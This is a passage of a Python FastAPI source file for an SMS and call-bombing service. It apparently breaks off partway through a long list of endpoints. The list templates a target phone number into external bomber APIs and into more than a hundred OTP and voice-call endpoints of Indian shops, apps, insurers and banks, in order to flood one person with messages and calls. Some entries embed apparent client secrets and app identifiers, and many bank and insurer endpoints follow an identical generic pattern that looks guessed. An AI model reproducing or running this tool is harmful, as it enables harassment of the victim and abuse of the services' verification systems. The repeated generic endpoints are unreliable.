import asyncio
import time
from fastapi import FastAPI, Query
from fastapi.responses import HTMLResponse, JSONResponse
import aiohttp

app = FastAPI(title="Rudra API Service")

# ============================================================
# MASTER API LIST — All APIs combined, de-duplicated
# ============================================================

APIS = [
    # ============================================================
    # SECTION 1: EXTERNAL BOMBER APIs (GET)
    # ============================================================
    {"name": "FreeFire Bomber", "url": lambda p, d: f"https://freefire-api.ct.ws/bomber4.php?phone={p}&duration={d}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None},
    {"name": "Call Bomber API", "url": lambda p, d: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None},
    {"name": "Bomberr API", "url": lambda p, d: f"https://bomberr.onrender.com/num={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None},
    {"name": "RootX Bomber", "url": lambda p, d: f"https://bomber-rootxindia.satyamrajsingh562.workers.dev/start?key=demo&n={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None},
    {"name": "SMS Bomber Worker", "url": lambda p, d: f"http://sms-bomber.subhxcosmo.workers.dev/api?num={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "Bomberrr Vercel", "url": lambda p, d: f"https://bomberrr.vercel.app/?key=roots&number={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "Bolbet", "url": lambda p, d: f"https://bolbet-liart.vercel.app/?key=roots&number={p}", "method": "GET", "headers": {}, "data": None},

    # ============================================================
    # SECTION 2: SMS OTP APIs (POST)
    # ============================================================
    {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}&countryCode=IN"},
    {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Wakefit SMS", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Hungama OTP", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
    {"name": "Dayco India", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
    {"name": "ShipRocket SMS", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "PenPencil SMS", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "1MG Voice Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "KPN Fresh WEB", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", "method": "POST", "headers": {"Content-Type": "application/json", "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797"}, "data": lambda p, d: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
    {"name": "ServeTel SMS", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
    {"name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "Doubtnut SMS", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "GoPink Cabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "data": lambda p, d: f"check_mobile_number=1&contact={p}"},
    {"name": "Myntra SMS", "url": "https://www.myntra.com/gw/mobile-auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart SMS", "url": "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Amazon SMS", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"email={p}&create=1"},
    {"name": "Zomato SMS", "url": "https://www.zomato.com/php/asyncLogin.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}"},
    {"name": "Paytm SMS", "url": "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","loginData":"LOGIN_USING_PHONE"}}'},
    {"name": "PhonePe SMS", "url": "https://www.phonepe.com/api/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "BigBasket SMS", "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile_number":"{p}"}}'},
    {"name": "Meesho SMS", "url": "https://api.meesho.com/v2/auth/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Snapdeal SMS", "url": "https://www.snapdeal.com/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Makemytrip SMS", "url": "https://www.makemytrip.com/api/umbrella/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "OYO SMS", "url": "https://api.oyoroomscrm.com/api/v2/user/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Rapido SMS", "url": "https://rapido.bike/api/v2/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Uber SMS", "url": "https://auth.uber.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Dominos SMS", "url": "https://order.godominos.co.in/Online/App.aspx", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"PhoneNo={p}"},
    {"name": "BookMyShow SMS", "url": "https://in.bmscdn.com/mjson/User/SendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNo":"{p}"}}'},
    {"name": "Netmeds SMS", "url": "https://www.netmeds.com/api/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Medlife SMS", "url": "https://api.medlife.com/v2/user/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Practo SMS", "url": "https://www.practo.com/patient/loginviapassword", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Ajio SMS", "url": "https://www.ajio.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Nykaa SMS", "url": "https://www.nykaa.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Croma SMS", "url": "https://api.croma.com/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Reliance Digital SMS", "url": "https://www.reliancedigital.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "FirstCry SMS", "url": "https://www.firstcry.com/api/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Licious SMS", "url": "https://api.licious.com/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Zepto SMS", "url": "https://api.zepto.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Blinkit SMS", "url": "https://blinkit.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Mobikwik SMS", "url": "https://www.mobikwik.com/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Freecharge SMS", "url": "https://www.freecharge.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Airtel Thanks SMS", "url": "https://www.airtel.in/thanks-app/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Jio SMS", "url": "https://www.jio.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Vodafone Idea SMS", "url": "https://www.myvi.in/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Byju's SMS", "url": "https://byjus.com/api/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Unacademy SMS", "url": "https://unacademy.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Vedantu SMS", "url": "https://www.vedantu.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Toppr SMS", "url": "https://www.toppr.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "WhiteHat Jr SMS", "url": "https://www.whitehatjr.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Cult.fit SMS", "url": "https://www.cult.fit/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "HealthifyMe SMS", "url": "https://www.healthifyme.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Pristyn Care SMS", "url": "https://www.pristyncare.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "PharmEasy OTP", "url": "https://pharmeasy.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Tata 1mg SMS", "url": "https://www.1mg.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Apollo 24/7 SMS", "url": "https://www.apollo247.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "MFine SMS", "url": "https://www.mfine.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "DocsApp SMS", "url": "https://www.docsapp.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Lybrate SMS", "url": "https://www.lybrate.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Portea Medical SMS", "url": "https://www.portea.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "PolicyBazaar SMS", "url": "https://www.policybazaar.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "CoverFox SMS", "url": "https://www.coverfox.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Acko SMS", "url": "https://www.acko.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Digit Insurance SMS", "url": "https://www.godigit.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "HDFC Ergo SMS", "url": "https://www.hdfcergo.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "ICICI Lombard SMS", "url": "https://www.icicilombard.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Bajaj Allianz SMS", "url": "https://www.bajajallianz.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Star Health SMS", "url": "https://www.starhealth.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Max Bupa SMS", "url": "https://www.maxbupa.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Kotak Life SMS", "url": "https://www.kotaklife.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "SBI Life SMS", "url": "https://www.sbilife.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "LIC India SMS", "url": "https://www.licindia.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "HDFC Life SMS", "url": "https://www.hdfclife.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},

    # ============================================================
    # SECTION 3: BANKING APIs
    # ============================================================
    {"name": "Axis Bank SMS", "url": "https://www.axisbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "ICICI Bank SMS", "url": "https://www.icicibank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "HDFC Bank SMS", "url": "https://www.hdfcbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "SBI Bank SMS", "url": "https://www.sbi.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Kotak Bank SMS", "url": "https://www.kotak.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Yes Bank SMS", "url": "https://www.yesbank.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "IndusInd Bank SMS", "url": "https://www.indusind.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "IDFC Bank SMS", "url": "https://www.idfcfirstbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "AU Bank SMS", "url": "https://www.aubank.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "RBL Bank SMS", "url": "https://www.rblbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Bandhan Bank SMS", "url": "https://www.bandhanbank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Federal Bank SMS", "url": "https://www.federalbank.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Canara Bank SMS", "url": "https://www.canarabank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "PNB SMS", "url": "https://www.pnbindia.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Bank of Baroda SMS", "url": "https://www.bankofbaroda.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Union Bank SMS", "url": "https://www.unionbankofindia.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Indian Bank SMS", "url": "https://www.indianbank.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Central Bank SMS", "url": "https://www.centralbankofindia.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Bank of India SMS", "url": "https://www.bankofindia.co.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "IDBI Bank SMS", "url": "https://www.idbibank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "UCO Bank SMS", "url": "https://www.ucobank.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Indian Overseas SMS", "url": "https://www.iob.in/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Punjab & Sind SMS", "url": "https://www.psbindia.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},

    # ============================================================
    # SECTION 4: REAL WORKING SMS APIs (v2 list)
    # ============================================================
    {"name": "Lenskart SMS v2", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "X-API-Client": "mobilesite", "X-Country-Code": "IN"}, "data": lambda p, d: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "GoKwik SMS", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "gk-merchant-id": "19g6jlc658iad"}, "data": lambda p, d: f'{{"phone":"{p}","country":"in"}}'},
    {"name": "Wakefit SMS v2", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json", "API-Secret-Key": "ycq55IbIjkLb"}, "data": lambda p, d: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'},
    {"name": "Khatabook SMS", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "BeepKart SMS", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","city":362}}'},
    {"name": "Snitch SMS", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json", "client-id": "snitch_secret"}, "data": lambda p, d: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "RummyCircle SMS", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","isPlaycircle":false}}'},
    {"name": "PokerBaazi SMS", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","mfa_channels":"phno"}}'},
    {"name": "My11Circle SMS", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Cosmofeed SMS", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","version":"1.4.28"}}'},
    {"name": "Dream11 SMS", "url": "https://www.dream11.com/auth/passwordless/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"channel":"sms","flow":"SIGNUP","phoneNumber":"{p}","templateName":"default"}}'},
    {"name": "Unacademy SMS v2", "url": "https://unacademy.com/api/v3/user/user_check/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","send_otp":true}}'},
    {"name": "Vedantu SMS v2", "url": "https://user.vedantu.com/user/preLoginVerification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phoneNumber":"{p}","phoneCode":"+91"}}'},
    {"name": "Byju's SMS v2", "url": "https://bcas-prod.byjusweb.com/api/send-otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phoneNumber={p}"},
    {"name": "Spinny OTP", "url": "https://api.spinny.com/api/c/user/otp-request/v3/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"contact_number":"{p}","whatsapp":false,"code_len":4,"expected_action":"login"}}'},
    {"name": "Citymall OTP", "url": "https://citymall.live/api/cl-user/auth/get-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}"}}'},
    {"name": "Jobhai OTP", "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Kwikfix OTP", "url": "https://admin.kwikfixauto.in/api/auth/signupotp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Brevistay OTP", "url": "https://www.brevistay.com/cst/app-api/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Hourlyrooms OTP", "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "BharatLoan OTP", "url": "https://www.bharatloan.com/login-sbm", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile={p}"},
    {"name": "Pagarbook OTP", "url": "https://api.pagarbook.com/api/v5/auth/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","language":1}}'},
    {"name": "Redcliffe OTP", "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}"}}'},
    {"name": "55Club OTP", "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"91{p}","codeType":1}}'},
    {"name": "Woodenstreet OTP", "url": "https://api.woodenstreet.com/api/v1/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"telephone":"{p}"}}'},
    {"name": "Lending Plate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobiles={p}&resend=Resend"},
    {"name": "NewMe SMS", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
    {"name": "Smytten SMS", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json", "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f"}, "data": lambda p, d: f'{{"phone":"{p}","email":"test@example.com"}}'},
    {"name": "CaratLane SMS", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"query":"mutation {{ SendOtp(input: {{ mobile: \\"{p}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\" }}) {{ status {{ message code }} }} }}"}}'},
    {"name": "WellAcademy SMS", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"contact_no":"{p}"}}'},
    {"name": "Shemaroome SMS", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}, "data": lambda p, d: f"mobile_no=%2B91{p}"},
    {"name": "Cossouq SMS", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobilenumber={p}&otptype=register"},
    {"name": "MyImagineStore SMS", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile={p}"},
    {"name": "Otpless SMS", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","selectedCountryCode":"+91"}}'},
    {"name": "MyHubble Money", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phoneNumber":"{p}","channel":"SMS"}}'},
    {"name": "Tata Capital Business", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'},
    {"name": "DealShare SMS", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}","hashCode":"k387IsBaTmn"}}'},
    {"name": "Snapmint SMS", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Housing.com SMS", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","country_url_name":"in"}}'},
    {"name": "RentoMojo SMS", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}"}}'},
    {"name": "Netmeds SMS v2", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
